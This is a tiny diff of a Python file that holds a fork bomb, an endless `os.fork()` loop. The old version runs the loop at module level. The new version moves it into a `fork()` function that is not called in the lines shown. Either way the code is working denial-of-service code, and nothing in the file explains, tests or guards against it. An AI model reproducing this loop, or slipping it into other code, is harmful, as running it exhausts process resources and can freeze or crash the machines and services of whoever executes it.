@@ -1,4 +1,5 @@
 import os
 
-while True:
-     os.fork()
+def fork():
+    while True:
+         os.fork()
